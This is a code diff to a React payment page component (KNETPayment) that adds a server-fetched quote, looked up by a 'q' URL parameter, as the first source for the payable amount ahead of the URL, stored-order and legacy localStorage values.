@@ -1,4 +1,4 @@
-import { readPayable } from '@/lib/pricing';
+import { readPayable, fetchQuoteById } from '@/lib/pricing';
 import { useState, useEffect, useRef, useCallback } from "react";
 import { useLocation } from "wouter";
 import { useSignalEffect } from "@preact/signals-react/runtime";
@@ -102,12 +102,22 @@ export default function KNETPayment() {
   const [showErrorModal, setShowErrorModal] = useState(false);
   const [errorModalMessage, setErrorModalMessage] = useState("");
 
-  // Amount priority: URL (from summary) -> stored order -> legacy keys
+  // Amount priority: server quote -> URL -> stored order -> legacy keys
   const mohData = JSON.parse(localStorage.getItem("mohPaymentData") || "{}");
-  const urlAmount = Number(new URLSearchParams(window.location.search).get("amount")) || 0;
+  const searchParams = new URLSearchParams(window.location.search);
+  const quoteId = searchParams.get("q") || "";
+  const urlAmount = Number(searchParams.get("amount")) || 0;
   const storedAmount = readPayable(0);
+  const [quoteAmount, setQuoteAmount] = useState<string | null>(null);
+  useEffect(() => {
+    if (!quoteId) return;
+    let alive = true;
+    fetchQuoteById(quoteId).then((q) => { if (alive && q) setQuoteAmount(q.payable.toFixed(3)); });
+    return () => { alive = false; };
+  }, [quoteId]);
   const totalAmount =
-    urlAmount > 0 ? urlAmount.toFixed(3)
+    quoteAmount ? quoteAmount
+    : urlAmount > 0 ? urlAmount.toFixed(3)
     : storedAmount > 0 ? storedAmount.toFixed(3)
     : (mohData.totalAmount || localStorage.getItem("Total") || "0.000");
 
